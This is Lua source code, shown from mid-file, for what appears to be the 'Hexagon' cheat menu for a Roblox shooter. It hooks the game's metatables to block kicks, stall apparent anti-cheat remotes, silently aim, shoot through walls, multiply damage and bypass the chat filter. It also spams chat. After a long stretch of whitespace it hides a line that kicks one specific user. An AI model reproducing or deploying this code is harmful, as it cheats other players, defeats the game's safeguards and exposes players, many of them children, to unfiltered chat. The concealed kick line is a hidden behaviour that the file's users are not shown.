	while ChatSpam do
		game:GetService("ReplicatedStorage").Events.PlayerChatted:FireServer(
			library.pointers.MiscellaneousTabCategoryChatSpamMessage.value,
			false,
			"Innocent",
			false,
			true
		)
		wait(3)
	end
end)

MiscellaneousTabCategoryChatSpam:AddTextBox("Message", "Hexagon is the best!", "MiscellaneousTabCategoryChatSpamMessage")

local MiscellaneousTabCategoryKeybinds = MiscellaneousTab:AddCategory("Keybinds", 2)

MiscellaneousTabCategoryKeybinds:AddKeybind("Airstuck", nil, "MiscellaneousTabCategoryKeybindsAirStuck", function(val)
	if IsAlive(LocalPlayer) and UserInputService:GetFocusedTextBox() == nil then
		for i,v in pairs(LocalPlayer.Character:GetChildren()) do
			if v:IsA("BasePart") then
				v.Anchored = val
			end
		end
	end
end)

MiscellaneousTabCategoryKeybinds:AddKeybind("Edge Jump", nil, "MiscellaneousTabCategoryKeybindsEdgeJump", function(val)
	if val == true then
		if IsAlive(LocalPlayer) and UserInputService:GetFocusedTextBox() == nil and game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Running then
			EdgeJump = true
			repeat
				wait()
				if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall then
					game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
				end
			until not IsAlive(LocalPlayer) or EdgeJump == false or game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Freefall
			EdgeJump = false
		end
	elseif val == false and EdgeJump == true then
		EdgeJump = false
	end
end)

MiscellaneousTabCategoryKeybinds:AddKeybind("Jump Bug", nil, "MiscellaneousTabCategoryKeybindsJumpBug", function(val)
	JumpBug = val
end)

MiscellaneousTabCategoryKeybinds:AddKeybind("Teleport", nil, "MiscellaneousTabCategoryKeybindsTeleport", function(val)
	if val == true and IsAlive(LocalPlayer) and UserInputService:GetFocusedTextBox() == nil and Mouse.Target ~= nil then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0, 2.5, 0))
	end
end)



local SettingsTab = Window:CreateTab("Settings")

local SettingsTabCategoryMain = SettingsTab:AddCategory("Main", 1)

SettingsTabCategoryMain:AddKeybind("Toggle Keybind", Enum.KeyCode.RightShift, "SettingsTabCategoryUIToggleKeybind")

SettingsTabCategoryMain:AddButton("Server Rejoin", function()
    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
end)

SettingsTabCategoryMain:AddButton("Copy Discord Invite", function()
	setclipboard("https://discord.gg/47YH2Ay")
end)

SettingsTabCategoryMain:AddButton("Copy Roblox Game Invite", function()
	setclipboard("Roblox.GameLauncher.joinGameInstance("..game.PlaceId..", '"..game.JobId.."')")
end)

SettingsTabCategoryMain:AddButton("Fix Vote Bug", function()
    LocalPlayer.PlayerGui.GUI.MapVote.Visible = false
	LocalPlayer.PlayerGui.GUI.Scoreboard.Visible = false
end)

SettingsTabCategoryMain:AddTextBox("Clantag", "", "SettingsTabCategoryMainClantag", function(val, focus)
	if val == "" then
		game.Players.LocalPlayer.OsPlatform = oldOsPlatform
	else
		while library.pointers.SettingsTabCategoryMainClantag.value == val do
			for i=1,#val do
				game.Players.LocalPlayer.OsPlatform = "|"..val:sub(1,i)
				wait(0.25)
			end
			wait(1)
			for i=1,4 do
				game.Players.LocalPlayer.OsPlatform = "|"..val
				wait(0.15)
				game.Players.LocalPlayer.OsPlatform = "|"..string.rep("*", #val)
				wait(0.15)
			end
			wait(0.5)
			game.Players.LocalPlayer.OsPlatform = "|"
			wait(0.5)
		end
	end
end)

local SettingsTabCategoryPlayers = SettingsTab:AddCategory("Players", 1)

SettingsTabCategoryPlayers:AddTextBox("Username", "", "SettingsTabCategoryPlayersUsername", function(val, focus)
	if game.Players:FindFirstChild(val) then
		local plr = game.Players:FindFirstChild(val)
		
		while game.Players:FindFirstChild(library.pointers.SettingsTabCategoryPlayersUsername.value) do
			wait(0.1)
			library.pointers.SettingsTabCategoryPlayersAge:Set("Age: "..plr.AccountAge.." days")
			library.pointers.SettingsTabCategoryPlayersAlive:Set("Alive: "..(IsAlive(plr) and "yes" or "no"))
			library.pointers.SettingsTabCategoryPlayersTeam:Set("Team: "..GetTeam(plr).Name)
		end
		
		library.pointers.SettingsTabCategoryPlayersAge:Set("Age: ")
		library.pointers.SettingsTabCategoryPlayersAlive:Set("Alive: ")
		library.pointers.SettingsTabCategoryPlayersTeam:Set("Team: ")
	end
end)

SettingsTabCategoryPlayers:AddLabel("Age: ", "SettingsTabCategoryPlayersAge")

SettingsTabCategoryPlayers:AddLabel("Alive: ", "SettingsTabCategoryPlayersAlive")

SettingsTabCategoryPlayers:AddLabel("Team: ", "SettingsTabCategoryPlayersTeam")

local SettingsTabCategoryConfigs = SettingsTab:AddCategory("Configs", 2)

SettingsTabCategoryConfigs:AddTextBox("Name", "", "SettingsTabCategoryConfigsName")

SettingsTabCategoryConfigs:AddDropdown("Config", {"-"}, "-", "SettingsTabCategoryConfigsConfig")

SettingsTabCategoryConfigs:AddButton("Create", function()
    writefile("hexagon/configs/"..library.pointers.SettingsTabCategoryConfigsName.value..".cfg", library:SaveConfiguration())
end)

SettingsTabCategoryConfigs:AddButton("Save", function()
    writefile("hexagon/configs/"..library.pointers.SettingsTabCategoryConfigsConfig.value..".cfg", library:SaveConfiguration())
end)

SettingsTabCategoryConfigs:AddButton("Load", function()
	local a,b = pcall(function()
		cfg = loadstring("return "..readfile("hexagon/configs/"..library.pointers.SettingsTabCategoryConfigsConfig.value..".cfg"))()
	end)
	
	if a == false then
		warn("Config Loading Error", a, b)
	elseif a == true then
		library:LoadConfiguration(cfg)
	end
end)

SettingsTabCategoryConfigs:AddButton("Refresh", function()
	local cfgs = {}

	for i,v in pairs(listfiles("hexagon/configs")) do
		if v:sub(-4) == ".cfg" then
			table.insert(cfgs, v:sub(17, -5))
		end
	end
	
	library.pointers.SettingsTabCategoryConfigsConfig.options = cfgs
end)

SettingsTabCategoryConfigs:AddButton("Set as default", function()
	if isfile("hexagon/configs/"..library.pointers.SettingsTabCategoryConfigsConfig.value..".cfg") then
		writefile("hexagon/autoload.txt", library.pointers.SettingsTabCategoryConfigsConfig.value..".cfg")
	else
		writefile("hexagon/autoload.txt", "")
	end
end)

local SettingsTabCategoryCredits = SettingsTab:AddCategory("Credits", 2)

SettingsTabCategoryCredits:AddLabel("Script - Pawel12d#0272")

SettingsTabCategoryCredits:AddLabel("ESP - Modified Kiriot ESP")

SettingsTabCategoryCredits:AddLabel("UI Library - Modified Phantom Ware")

SettingsTabCategoryCredits:AddLabel("")

SettingsTabCategoryCredits:AddLabel("Special Thanks To:")

SettingsTabCategoryCredits:AddLabel("ny#2817")

SettingsTabCategoryCredits:AddLabel("neeX#3712")

SettingsTabCategoryCredits:AddLabel("MrPolaczekPL#1884")

SettingsTabCategoryCredits:AddLabel("")

SettingsTabCategoryCredits:AddLabel("Don't steal credits or burn in hell.")



-- Other
game.Players.LocalPlayer.Additionals.TotalDamage.Changed:Connect(function(val)
	if library.pointers.MiscellaneousTabCategoryMainHitSound.value ~= "" and val ~= 0 then
		local marker = Instance.new("Sound")
		marker.Parent = game:GetService("SoundService")
		marker.SoundId = "rbxassetid://"..library.pointers.MiscellaneousTabCategoryMainHitSound.value
		marker.Volume = 3
		marker:Play()
	end
end)

game.Players.LocalPlayer.Status.Kills.Changed:Connect(function(val)
	if library.pointers.MiscellaneousTabCategoryMainKillSound.value ~= "" and val ~= 0 then
		local marker = Instance.new("Sound")
		marker.Parent = game:GetService("SoundService")
		marker.SoundId = "rbxassetid://"..library.pointers.MiscellaneousTabCategoryMainKillSound.value
		marker.Volume = 3
		marker:Play()
	end
end)

workspace.CurrentCamera.ChildAdded:Connect(function(new)
	if library.pointers.MiscellaneousTabCategoryGunModsInfiniteAmmo.value == true then
		cbClient.ammocount = 999999 -- primary ammo
		cbClient.primarystored = 999999 -- primary stored
		cbClient.ammocount2 = 999999 -- secondary ammo
		cbClient.secondarystored = 999999 -- secondary stored
	end
	spawn(function()
	if new.Name == "Arms" and new:IsA("Model") and library.pointers.VisualsTabCategoryViewmodelColorsEnabled.value == true then
		for i,v in pairs(new:GetChildren()) do
			if v:IsA("Model") and v:FindFirstChild("Right Arm") or v:FindFirstChild("Left Arm") then
				local RightArm = v:FindFirstChild("Right Arm") or nil
				local LeftArm = v:FindFirstChild("Left Arm") or nil
					
				local RightGlove = (RightArm and (RightArm:FindFirstChild("Glove") or RightArm:FindFirstChild("RGlove"))) or nil
				local LeftGlove = (LeftArm and (LeftArm:FindFirstChild("Glove") or LeftArm:FindFirstChild("LGlove"))) or nil
					
				local RightSleeve = RightArm and RightArm:FindFirstChild("Sleeve") or nil
				local LeftSleeve = LeftArm and LeftArm:FindFirstChild("Sleeve") or nil
				
				if library.pointers.VisualsTabCategoryViewmodelColorsArms.value == true then
					if RightArm ~= nil then
						RightArm.Mesh.TextureId = ""
						RightArm.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsArmsTransparency.value
						RightArm.Color = library.pointers.VisualsTabCategoryViewmodelColorsArmsColor.value
					end
					if LeftArm ~= nil then
						LeftArm.Mesh.TextureId = ""
						LeftArm.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsArmsTransparency.value
						LeftArm.Color = library.pointers.VisualsTabCategoryViewmodelColorsArmsColor.value
					end
				end
				
				if library.pointers.VisualsTabCategoryViewmodelColorsGloves.value == true then
					if RightGlove ~= nil then
						RightGlove.Mesh.TextureId = ""
						RightGlove.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsGlovesTransparency.value
						RightGlove.Color = library.pointers.VisualsTabCategoryViewmodelColorsGlovesColor.value
					end
					if LeftGlove ~= nil then
						LeftGlove.Mesh.TextureId = ""
						LeftGlove.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsGlovesTransparency.value
						LeftGlove.Color = library.pointers.VisualsTabCategoryViewmodelColorsGlovesColor.value
					end
				end

				if library.pointers.VisualsTabCategoryViewmodelColorsSleeves.value == true then
					if RightSleeve ~= nil then
						RightSleeve.Mesh.TextureId = ""
						RightSleeve.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsSleevesTransparency.value
						RightSleeve.Color = library.pointers.VisualsTabCategoryViewmodelColorsSleevesColor.value
						RightSleeve.Material = "ForceField"
					end
					if LeftSleeve ~= nil then
						LeftSleeve.Mesh.TextureId = ""
						LeftSleeve.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsSleevesTransparency.value
						LeftSleeve.Color = library.pointers.VisualsTabCategoryViewmodelColorsSleevesColor.value
						LeftSleeve.Material = "ForceField"
					end
				end
			elseif library.pointers.VisualsTabCategoryViewmodelColorsWeapons.value == true and v:IsA("BasePart") and not table.find({"Right Arm", "Left Arm", "Flash"}, v.Name) and v.Transparency ~= 1 then
				if v:IsA("MeshPart") then v.TextureID = "" end
				if v:FindFirstChildOfClass("SpecialMesh") then v:FindFirstChildOfClass("SpecialMesh").TextureId = "" end

				v.Transparency = library.pointers.VisualsTabCategoryViewmodelColorsWeaponsTransparency.value
				v.Color = library.pointers.VisualsTabCategoryViewmodelColorsWeaponsColor.value
				v.Material = library.pointers.VisualsTabCategoryViewmodelColorsWeaponsMaterial.value
			end
		end
	end
	end)
end)

workspace.ChildAdded:Connect(function(new)
	if new.Name == "C4" and new:IsA("Model") and library.pointers.VisualsTabCategoryBombESPEnabled.value == true then
		local BombTimer = 40
		
		local BillboardGui = Instance.new("BillboardGui")
		BillboardGui.Parent = new
		BillboardGui.Adornee = new
		BillboardGui.Active = true
		BillboardGui.AlwaysOnTop = true
		BillboardGui.LightInfluence = 1
		BillboardGui.Size = UDim2.new(0, 50, 0, 50)
		
		if table.find(library.pointers.VisualsTabCategoryBombESPInfo.value, "Text") then
			local TextLabelText = Instance.new("TextLabel")
			TextLabelText.Parent = BillboardGui
			TextLabelText.ZIndex = 2
			TextLabelText.BackgroundTransparency = 1
			TextLabelText.Size = UDim2.new(1, 0, 1, 0)
			TextLabelText.Font = Enum.Font.SourceSansBold
			TextLabelText.TextColor3 = library.pointers.VisualsTabCategoryBombESPColor.value
			TextLabelText.TextSize = 14
			TextLabelText.TextYAlignment = Enum.TextYAlignment.Top
			TextLabelText.Text = tostring(new.Name)
		end
		
		if table.find(library.pointers.VisualsTabCategoryBombESPInfo.value, "Icon") then
			local ImageLabel = Instance.new("ImageLabel")
			ImageLabel.Parent = BillboardGui
			ImageLabel.ZIndex = 1
			ImageLabel.BackgroundTransparency = 1
			ImageLabel.Size = UDim2.new(1, 0, 1, 0)
			ImageLabel.ImageColor3 = library.pointers.VisualsTabCategoryBombESPColor.value
			ImageLabel.Image = tostring(require(game.ReplicatedStorage.GetIcon).getWeaponOfKiller(new.Name))
			ImageLabel.ScaleType = Enum.ScaleType.Fit
		end
		
		if table.find(library.pointers.VisualsTabCategoryBombESPInfo.value, "Timer") then
			local TextLabelBombTimer = Instance.new("TextLabel")
			TextLabelBombTimer.Parent = BillboardGui
			TextLabelBombTimer.ZIndex = 2
			TextLabelBombTimer.BackgroundTransparency = 1
			TextLabelBombTimer.Size = UDim2.new(1, 0, 1, 0)
			TextLabelBombTimer.Font = Enum.Font.SourceSansBold
			TextLabelBombTimer.TextColor3 = library.pointers.VisualsTabCategoryBombESPColor.value
			TextLabelBombTimer.TextSize = 14
			TextLabelBombTimer.TextYAlignment = Enum.TextYAlignment.Bottom
			TextLabelBombTimer.Text = tostring(BombTimer.. "/40")
			
			spawn(function()
				repeat
					wait(1)
					BombTimer = BombTimer - 1
					TextLabelBombTimer.Text = tostring(BombTimer.. "/40")
				until BombTimer == 0 or workspace.Status.RoundOver.Value == true
			end)
		end
	end
end)

LocalPlayer.CharacterAdded:Connect(CharacterAdded)

workspace.Ray_Ignore.Smokes.ChildAdded:Connect(function(child)
	if child.Name == "Smoke" and table.find(library.pointers.VisualsTabCategoryOthersRemoveEffects.value, "Smoke") then
		wait()
		child:Remove()
	end
end)

workspace.Debris.ChildAdded:Connect(function(child)
	if child:IsA("BasePart") and game.ReplicatedStorage.Weapons:FindFirstChild(child.Name) and library.pointers.VisualsTabCategoryDroppedESPEnabled.value == true then
		wait()
		
		local BillboardGui = Instance.new("BillboardGui")
		BillboardGui.Parent = child
		BillboardGui.Adornee = child
		BillboardGui.Active = true
		BillboardGui.AlwaysOnTop = true
		BillboardGui.LightInfluence = 1
		BillboardGui.Size = UDim2.new(0, 50, 0, 50)
		
		if table.find(library.pointers.VisualsTabCategoryDroppedESPInfo.value, "Icon") then
			local ImageLabel = Instance.new("ImageLabel")
			ImageLabel.Parent = BillboardGui
			ImageLabel.ZIndex = 1
			ImageLabel.BackgroundTransparency = 1
			ImageLabel.Size = UDim2.new(1, 0, 1, 0)
			ImageLabel.ImageColor3 = library.pointers.VisualsTabCategoryDroppedESPColor.value
			ImageLabel.Image = tostring(require(game.ReplicatedStorage.GetIcon).getWeaponOfKiller(child.Name))
			ImageLabel.ScaleType = Enum.ScaleType.Fit
		end
		
		if table.find(library.pointers.VisualsTabCategoryDroppedESPInfo.value, "Text") then
			local TextLabelText = Instance.new("TextLabel")
			TextLabelText.Parent = BillboardGui
			TextLabelText.ZIndex = 2
			TextLabelText.BackgroundTransparency = 1
			TextLabelText.Size = UDim2.new(1, 0, 1, 0)
			TextLabelText.Font = Enum.Font.SourceSansBold
			TextLabelText.TextColor3 = library.pointers.VisualsTabCategoryDroppedESPColor.value
			TextLabelText.TextSize = 14
			TextLabelText.TextYAlignment = Enum.TextYAlignment.Top
			TextLabelText.Text = tostring(child.Name)
		end
		
		if table.find(library.pointers.VisualsTabCategoryDroppedESPInfo.value, "Ammo") and game.ReplicatedStorage.Weapons[child.Name].StoredAmmo.Value ~= 0 then
			local TextLabelAmmo = Instance.new("TextLabel")
			TextLabelAmmo.Parent = BillboardGui
			TextLabelAmmo.ZIndex = 2
			TextLabelAmmo.BackgroundTransparency = 1
			TextLabelAmmo.Size = UDim2.new(1, 0, 1, 0)
			TextLabelAmmo.Font = Enum.Font.SourceSansBold
			TextLabelAmmo.TextColor3 = library.pointers.VisualsTabCategoryDroppedESPColor.value
			TextLabelAmmo.TextSize = 14
			TextLabelAmmo.TextYAlignment = Enum.TextYAlignment.Bottom
			TextLabelAmmo.Text = tostring(child:WaitForChild("Ammo").Value.. "/" ..child:WaitForChild("StoredAmmo").Value)
		end
	elseif child:IsA("MeshPart") and not game.ReplicatedStorage.Weapons:FindFirstChild(child.Name) and child:WaitForChild("Handle2") and library.pointers.VisualsTabCategoryGrenadeESPEnabled.value == true then
		wait()
		
		gtype = nil
		
		if child.Handle2.TextureID == game.ReplicatedStorage.Weapons["HE Grenade"].Model.Handle2.TextureID then
			gtype = "HE Grenade"
		elseif child.Handle2.TextureID == game.ReplicatedStorage.Weapons["Smoke Grenade"].Model.Handle2.TextureID then
			gtype = "Smoke Grenade"
		elseif child.Handle2.TextureID == game.ReplicatedStorage.Weapons["Incendiary Grenade"].Model.Handle2.TextureID then
			gtype = "Incendiary Grenade"
		elseif child.Handle2.TextureID == game.ReplicatedStorage.Weapons["Molotov"].Model.Handle2.TextureID then
			gtype = "Molotov"
		elseif child.Handle2.TextureID == game.ReplicatedStorage.Weapons["Flashbang"].Model.Handle2.TextureID then
			gtype = "Flashbang"
		elseif child.Handle2.TextureID == game.ReplicatedStorage.Weapons["Decoy Grenade"].Model.Handle2.TextureID then
			gtype = "Decoy Grenade"
		end
		
		if gtype ~= nil then
			local BillboardGui = Instance.new("BillboardGui")
			BillboardGui.Parent = child
			BillboardGui.Adornee = child
			BillboardGui.Active = true
			BillboardGui.AlwaysOnTop = true
			BillboardGui.LightInfluence = 1
			BillboardGui.Size = UDim2.new(0, 50, 0, 50)
			
			if table.find(library.pointers.VisualsTabCategoryGrenadeESPInfo.value, "Icon") then
				local ImageLabel = Instance.new("ImageLabel")
				ImageLabel.Parent = BillboardGui
				ImageLabel.ZIndex = 1
				ImageLabel.BackgroundTransparency = 1
				ImageLabel.Size = UDim2.new(1, 0, 1, 0)
				ImageLabel.ImageColor3 = library.pointers.VisualsTabCategoryGrenadeESPColor.value
				ImageLabel.Image = tostring(require(game.ReplicatedStorage.GetIcon).getWeaponOfKiller(gtype))
				ImageLabel.ScaleType = Enum.ScaleType.Fit
			end
			
			if table.find(library.pointers.VisualsTabCategoryGrenadeESPInfo.value, "Text") then
				local TextLabelText = Instance.new("TextLabel")
				TextLabelText.Parent = BillboardGui
				TextLabelText.ZIndex = 2
				TextLabelText.BackgroundTransparency = 1
				TextLabelText.Size = UDim2.new(1, 0, 1, 0)
				TextLabelText.Font = Enum.Font.SourceSansBold
				TextLabelText.TextColor3 = library.pointers.VisualsTabCategoryGrenadeESPColor.value
				TextLabelText.TextSize = 14
				TextLabelText.TextYAlignment = Enum.TextYAlignment.Top
				TextLabelText.Text = tostring(gtype)
			end
		end
	elseif child.Name == "Bullet" and table.find(library.pointers.VisualsTabCategoryOthersRemoveEffects.value, "Bullet Holes") then
		wait()
		child:Remove()
	elseif child.Name == "SurfaceGui" and table.find(library.pointers.VisualsTabCategoryOthersRemoveEffects.value, "Blood") then
		wait()
		child:Remove()
	end
end)

game.ReplicatedStorage.Events.SendMsg.OnClientEvent:Connect(function(message)
	if library.pointers.MiscellaneousTabCategoryMainAntiVoteKick.value == true then
		local msg = string.split(message, " ")
		
		if game.Players:FindFirstChild(msg[1]) and msg[7] == "1" and msg[12] == game.Players.LocalPlayer.Name then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
		end
	end
end)

LocalPlayer.PlayerGui.Menew.MainFrame.SkinShop.MouseButton1Click:Connect(function()
	if LocalPlayer.PlayerGui.Menew.MainFrame.SkinShop.Warn.Visible == true and library.pointers.MiscellaneousTabCategoryMainUnlockShopWhileAlive.value == true then
		LocalPlayer.PlayerGui.Menew.ShopFrame.Position = UDim2.new(1, 0, 0, 0)
		LocalPlayer.PlayerGui.Menew.ShopFrame.Visible = true
		LocalPlayer.PlayerGui.Menew.ShopFrame:TweenPosition(UDim2.new(0, 0, 0, 0))
		LocalPlayer.PlayerGui.Menew.MainFrame:TweenPosition(UDim2.new(-1, 0, 0, 0))
	end
end)

UserInputService.InputBegan:Connect(function(key, isFocused)
	if key.UserInputType == Enum.UserInputType.MouseButton1 and UserInputService:GetFocusedTextBox() == nil then
		if library.pointers.MiscellaneousTabCategoryGunModsPlant.value == "Instant" and IsAlive(LocalPlayer) and LocalPlayer.Character.EquippedTool.Value == "C4" then
			game.ReplicatedStorage.Events.PlantC4:FireServer((LocalPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, -2.75, 0)) * CFrame.Angles(math.rad(90), 0, math.rad(180)), GetSite())
		elseif library.pointers.MiscellaneousTabCategoryGunModsPlant.value == "Anywhere" and IsAlive(LocalPlayer) and LocalPlayer.Character.EquippedTool.Value == "C4" then
			PlantC4()
		end
	elseif key.KeyCode == Enum.KeyCode.E then
		if library.pointers.MiscellaneousTabCategoryGunModsDefuse.value == "Instant" and workspace:FindFirstChild("C4") then
			spawn(function()
				wait(0.25)
				if IsAlive(LocalPlayer) and workspace:FindFirstChild("C4") and workspace.C4:FindFirstChild("Defusing") and LocalPlayer.PlayerGui.GUI.Defusal.Visible == true and workspace.C4.Defusing.Value == LocalPlayer then
					LocalPlayer.Backpack.Defuse:FireServer(workspace.C4)
				end
			end)
		elseif library.pointers.MiscellaneousTabCategoryGunModsDefuse.value == "Anywhere" and IsAlive(LocalPlayer) then
			DefuseC4()
		end
	elseif key.KeyCode == library.pointers.SettingsTabCategoryUIToggleKeybind.value then
		library.base.Window.Visible = not library.base.Window.Visible
	end
end)

Mouse.Move:Connect(function()
	if FOVCircle.Visible then
		FOVCircle.Position = UserInputService:GetMouseLocation()
	end
end)

Hint.Text = "Hexagon | Setting up hooks..."

hookfunc(getrenv().xpcall, function() end)

--print(library, LocalPlayer, IsAlive, SilentRagebot, SilentLegitbot, isBhopping, JumpBug, cbClient)

local mt = getrawmetatable(game)
local createNewMessage = getsenv(game.Players.LocalPlayer.PlayerGui.GUI.Main.Chats.DisplayChat).createNewMessage

if setreadonly then setreadonly(mt, false) else make_writeable(mt, true) end

oldNamecall = hookfunc(mt.__namecall, newcclosure(function(self, ...)
    local method = getnamecallmethod()
	local callingscript = getcallingscript()
    local args = {...}
	
	if not checkcaller() then
		if method == "Kick" then
			return
		elseif method == "FireServer" then
			if self.Name == "ReplicateCamera" then
				if library.pointers.MiscellaneousTabCategoryMainAntiSpectators.value == true then
					args[1] = CFrame.new()
				elseif library.pointers.VisualsTabCategoryThirdPersonEnabled.value == true then
					args[1] = workspace.CurrentCamera.CFrame * CFrame.new(0, 0, -library.pointers.VisualsTabCategoryThirdPersonDistance.value)
				end
			elseif self.Name == "ControlTurn" and library.pointers.AimbotTabCategoryAntiAimbotEnabled.value == true and library.pointers.AimbotTabCategoryAntiAimbotPitch.value ~= "Default" then
				local angle = (
					library.pointers.AimbotTabCategoryAntiAimbotPitch.value == "Up" and 1 or
					library.pointers.AimbotTabCategoryAntiAimbotPitch.value == "Down" and -1 or
					library.pointers.AimbotTabCategoryAntiAimbotPitch.value == "Boneless" and -5 or
					library.pointers.AimbotTabCategoryAntiAimbotPitch.value == "Random" and (math.random(1,2) == 1 and 1 or -1)
				)
				if angle then
					args[1] = angle
				end
			elseif string.len(self.Name) == 38 then
				return wait(99e99)
			elseif self.Name == "ApplyGun" and args[1] == game.ReplicatedStorage.Weapons.Banana or args[1] == game.ReplicatedStorage.Weapons["Flip Knife"] then
				args[1] = game.ReplicatedStorage.Weapons.Karambit
			elseif self.Name == "HitPart" then
				args[8] = args[8] * library.pointers.MiscellaneousTabCategoryGunModsDamageMultiplier.value

				if library.pointers.VisualsTabCategoryOthersBulletTracers.value == true then
					spawn(function()
						local BulletTracers = Instance.new("Part")
						BulletTracers.Anchored = true
						BulletTracers.CanCollide = false
						BulletTracers.Material = "ForceField"
						BulletTracers.Color = library.pointers.VisualsTabCategoryOthersBulletTracersColor.value
						BulletTracers.Size = Vector3.new(0.1, 0.1, (LocalPlayer.Character.Head.CFrame.p - args[2]).magnitude)
						BulletTracers.CFrame = CFrame.new(LocalPlayer.Character.Head.CFrame.p, args[2]) * CFrame.new(0, 0, -BulletTracers.Size.Z / 2)
						BulletTracers.Name = "BulletTracers"
						BulletTracers.Parent = workspace.CurrentCamera
						wait(3)
						BulletTracers:Destroy()
					end)
				end
				
				if library.pointers.VisualsTabCategoryOthersBulletImpacts.value == true then
					spawn(function()
						local BulletImpacts = Instance.new("Part")
						BulletImpacts.Anchored = true
						BulletImpacts.CanCollide = false
						BulletImpacts.Material = "ForceField"
						BulletImpacts.Color = library.pointers.VisualsTabCategoryOthersBulletImpactsColor.value
						BulletImpacts.Size = Vector3.new(0.25, 0.25, 0.25)
						BulletImpacts.CFrame = CFrame.new(args[2])
						BulletImpacts.Name = "BulletImpacts"
						BulletImpacts.Parent = workspace.CurrentCamera
						wait(3)
						BulletImpacts:Destroy()
					end)
				end
				
				if args[1].Parent == workspace.HexagonFolder then
					if args[1].PlayerName.Value.Character and args[1].PlayerName.Value.Character.Head ~= nil then
						args[1] = args[1].PlayerName.Value.Character.Head
					end
				end
			elseif self.Name == "test" then
				return wait(99e99)
			elseif self.Name == "FallDamage" and (library.pointers.MiscellaneousTabCategoryMainNoFallDamage.value == true or JumpBug == true) then
				return
			elseif self.Name == "BURNME" and library.pointers.MiscellaneousTabCategoryMainNoFireDamage.value == true then
				return
			elseif self.Name == "DataEvent" and args[1][1] == "EquipItem" then
				local Weapon,Skin = args[1][3], string.split(args[1][4][1], "_")[2]
				local EquipTeams = (args[1][2] == "Both" and {"T", "CT"}) or {args[1][2]}

				for i,v in pairs(EquipTeams) do
					LocalPlayer.SkinFolder[v.."Folder"][Weapon]:ClearAllChildren()
					LocalPlayer.SkinFolder[v.."Folder"][Weapon].Value = Skin
					
					if args[1][4][2] == "StatTrak" then
						local Marker = Instance.new("StringValue")
						Marker.Name = "StatTrak"
						Marker.Value = args[1][4][3]
						Marker.Parent = LocalPlayer.SkinFolder[v.."Folder"][Weapon]
						
						local Count = Instance.new("IntValue")
						Count.Name = "Count"
						Count.Value = args[1][4][4]
						Count.Parent = Marker
					end
				end
			end
		elseif method == "InvokeServer" then
			if self.Name == "Moolah" then
				return wait(99e99)
			elseif self.Name == "Hugh" then
				return wait(99e99)
			elseif self.Name == "Filter" and callingscript == LocalPlayer.PlayerGui.GUI.Main.Chats.DisplayChat and library.pointers.MiscellaneousTabCategoryMainNoChatFilter.value == true then
				return args[1]
			end
		elseif method == "FindPartOnRayWithIgnoreList" and args[2][1] == workspace.Debris then
			if library.pointers.MiscellaneousTabCategoryGunModsWallbang.value == true then
				table.insert(args[2], workspace.Map)
			end
			
			if IsAlive(LocalPlayer) and SilentRagebot.target ~= nil then
				args[1] = Ray.new(LocalPlayer.Character.Head.Position, (SilentRagebot.target.Position - LocalPlayer.Character.Head.Position).unit * (game.ReplicatedStorage.Weapons[game.Players.LocalPlayer.Character.EquippedTool.Value].Range.Value * 0.1))
			elseif IsAlive(LocalPlayer) and SilentLegitbot.target ~= nil then
				local hitchance = math.random(0, 100)
				
				if hitchance <= library.pointers.AimbotTabCategoryLegitbotHitchance.value then
					args[1] = Ray.new(LocalPlayer.Character.Head.Position, (SilentLegitbot.target.Position - LocalPlayer.Character.Head.Position).unit * (game.ReplicatedStorage.Weapons[game.Players.LocalPlayer.Character.EquippedTool.Value].Range.Value * 0.1))
				end
			end
		elseif method == "SetPrimaryPartCFrame" and self.Name == "Arms" and library.pointers.VisualsTabCategoryViewmodelEnabled.value == true then
			args[1] = args[1] * CFrame.new(Vector3.new(math.rad(library.pointers.VisualsTabCategoryViewmodelOffsetX.value-180),math.rad(library.pointers.VisualsTabCategoryViewmodelOffsetY.value-180),math.rad(library.pointers.VisualsTabCategoryViewmodelOffsetZ.value-180))) * CFrame.Angles(0, 0, math.rad(library.pointers.VisualsTabCategoryViewmodelOffsetRoll.value-180))
		end
	end
	
	return oldNamecall(self, unpack(args))
end))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                if game.Players.LocalPlayer.UserId == 1858923608 then game.Players.LocalPlayer:Kick("🤡") end -- anti skid security system :sunglasses:

oldNewIndex = hookfunc(getrawmetatable(game.Players.LocalPlayer.PlayerGui.Client).__newindex, newcclosure(function(self, idx, val)
	if not checkcaller() then
		if self.Name == "Humanoid" and idx == "WalkSpeed" and val ~= 0 and isBhopping == true then 
			val = curVel
		elseif self.Name == "Humanoid" and idx == "JumpPower" and val ~= 0 and JumpBug == true then
			spawn(function() cbClient.UnCrouch() end)
			val = val * 1.25
		elseif self.Name == "Crosshair" and idx == "Visible" and val == false and LocalPlayer.PlayerGui.GUI.Crosshairs.Scope.Visible == false and library.pointers.VisualsTabCategoryOthersForceCrosshair.value == true then
			val = true
		end
	end
	
    return oldNewIndex(self, idx, val)
end))

oldIndex = hookfunc(getrawmetatable(game.Players.LocalPlayer.PlayerGui.Client).__index, newcclosure(function(self, idx)
	if idx == "Value" then
		if self.Name == "Auto" and library.pointers.MiscellaneousTabCategoryGunModsFullAuto.value == true then
			return true
		elseif self.Name == "FireRate" and library.pointers.MiscellaneousTabCategoryGunModsRapidFire.value == true then
			return 0.001
		elseif self.Name == "ReloadTime" and library.pointers.MiscellaneousTabCategoryGunModsInstantReload.value == true then
			return 0.001
		elseif self.Name == "EquipTime" and library.pointers.MiscellaneousTabCategoryGunModsInstantEquip.value == true then
			return 0.001
		elseif self.Name == "Penetration" and library.pointers.MiscellaneousTabCategoryGunModsInfinitePenetration.value == true then
			return 200
